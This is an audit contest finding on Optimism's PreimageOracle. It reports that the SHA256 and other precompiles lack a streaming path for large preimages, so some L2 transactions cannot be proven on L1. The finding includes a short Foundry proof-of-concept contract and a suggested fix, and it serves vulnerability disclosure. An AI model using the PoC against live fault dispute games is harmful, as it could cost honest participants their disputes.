# #28: Some preimages to precompiles cannot be proven using `loadPrecompilePreimagePart()` 
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sponsor confirmed', 'sufficient quality report', 'upgraded by judge', 'edited-by-warden', ':robot:_primary', ':robot:_74_group', 'duplicate-22']
Accepted: True

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L195
https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L335


# Vulnerability details

The `PreimageOracle` contracts offers a streaming option for Keccak256 operations through the LPP submission process. As described in the Optimism [specs](https://specs.optimism.io/fault-proof/stage-one/fault-dispute-game.html?highlight=large%20preimage%20proposal#preimageoracle-interaction), "in the event that the preimage is too large to be submitted through calldata in a single block, challengers must resort to the streaming option".

However, the lack of a similar streaming option for other precompiles that accept large inputs, like SHA256, RIPEMD and the identity precompile will cause calls to these precompile contracts with larger inputs to not be provable on L1.

In the PoC below, we show how this can be exploited to create a L2 transaction that, to be proved, requires submission of a SHA256 preimage that isn't feasible in L1 due to the constrained transaction size.

While these precompiles may not currently be used by out-of-scope parts of the codebase, the in-scope contracts pose no limitations on what precompile are meant to be accessible in this manner (can be accelerated).

## Impact
It is possible to craft transactions on L2 that can't be proven on L1. When this happens, a honest claim about the execution of these transactions can't be defended and will consequently risk an unfair loss of a fault dispute game on L1.

## Proof of Concept
The below PoC shows how:
- On L2, a we have a contract that feeds a large amount of data to the SHA256 precompile
- Under conditions that are somewhat specific but at the same time easy to create intentionally:
  - the transaction triggering the SHA sum can consume little enough gas to be executed on L2
  - the SHA preimage can be too large to fit an L1 transaction 

<details>
  <summary>Coded PoC (Foundry)</summary>

```Solidity
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract Hack is Test {
    function testL2Stream() public {
        uint preimageSize = 400_000;

        LargeHashContract sc = new LargeHashContract();
        bytes memory cdata = abi.encodeWithSelector(LargeHashContract.go.selector, preimageSize, block.timestamp);

        uint beforeGas = gasleft();
        // this transaction...
        address(sc).call(cdata);
        uint gasUsed = beforeGas - gasleft();

        // ...is easily feasible on L2...
        assertLe(cdata.length, 1e3);
        assertLe(gasUsed, 1e6);

        // ...but its SHA256 preimage can't be submitted
        // to PreimageOracle on L1 without streaming
        assertGt(preimageSize, 128e3);
    }
}

contract LargeHashContract {
    bytes32 public sha;

    function go (uint len, uint salt) external {
        assembly {
            mstore(salt, address())
            let success :=
                staticcall(
                            gas(), // Forward all available gas
                            0x02, // Address of SHA-256 precompile
                            0, // Start of input data in memory
                            len, // Size of input data
                            0, // Store output in scratch memory
                            0x20 // Output is always 32 bytes
                )
            if iszero(success) { revert(0, 0) }
            sstore(0, mload(0))
        }
    }
}
```

</details>

## Tools Used
Code review, Foundry

## Recommended Mitigation Steps
Consider adding streaming options for all precompiles, or disallow calling `loadPrecompilePreimagePart()` for precompiles with variable-sized inputs.


## Assessed type

Other